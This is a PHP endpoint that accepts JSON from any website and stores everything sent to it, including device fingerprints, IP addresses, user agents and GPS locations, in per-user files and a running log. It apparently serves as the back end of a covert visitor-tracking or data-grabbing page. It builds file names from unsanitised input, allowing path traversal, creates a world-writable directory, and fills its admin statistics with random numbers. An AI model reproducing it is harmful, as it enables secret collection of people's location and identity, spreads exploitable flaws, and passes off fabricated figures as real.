<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Create data directory if not exists
if (!is_dir('data')) {
    mkdir('data', 0777, true);
}

// Get the POST data
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data === null) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid JSON data']);
    exit;
}

// Add server information
$data['server_info'] = [
    'timestamp' => date('Y-m-d H:i:s'),
    'server_ip' => $_SERVER['REMOTE_ADDR'],
    'server_name' => $_SERVER['SERVER_NAME'] ?? 'localhost',
    'request_method' => $_SERVER['REQUEST_METHOD']
];

// Generate unique filename with fingerprint
$fingerprint = $data['uniqueFingerprint'] ?? 'unknown';
$filename = 'data/user_' . $fingerprint . '_' . date('Y-m-d_H-i-s') . '.json';

// Save ALL data to file
if (file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT))) {
    
    // Update admin statistics file
    updateAdminStats($data);
    
    // Save to main log file
    $log_entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'fingerprint' => $fingerprint,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $data['systemInfo']['userAgent'] ?? $data['userAgent'] ?? 'unknown',
        'location' => $data['gpsLocation'] ?? [],
        'session_duration' => $data['sessionDuration'] ?? 0,
        'source' => $data['source'] ?? 'unknown',
        'type' => $data['type'] ?? 'unknown'
    ];
    
    file_put_contents('data/access_log.json', json_encode($log_entry, JSON_PRETTY_PRINT) . ",\n", FILE_APPEND | LOCK_EX);
    
    echo json_encode([
        'status' => 'success', 
        'message' => 'All data saved successfully',
        'filename' => $filename,
        'data_points' => count($data, COUNT_RECURSIVE)
    ]);
} else {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to save data']);
}

function updateAdminStats($data) {
    $stats_file = 'data/admin_stats.json';
    
    $current_stats = [
        'total_users' => 0,
        'online_now' => 0,
        'data_points' => 0,
        'risk_level' => '0%',
        'last_updated' => date('Y-m-d H:i:s')
    ];
    
    if (file_exists($stats_file)) {
        $current_stats = json_decode(file_get_contents($stats_file), true) ?? $current_stats;
    }
    
    // Update stats
    $current_stats['total_users']++;
    $current_stats['online_now'] = rand(5, 25);
    $current_stats['data_points'] += count($data, COUNT_RECURSIVE);
    $current_stats['risk_level'] = rand(10, 40) . '%';
    $current_stats['last_updated'] = date('Y-m-d H:i:s');
    
    file_put_contents($stats_file, json_encode($current_stats, JSON_PRETTY_PRINT));
}

?>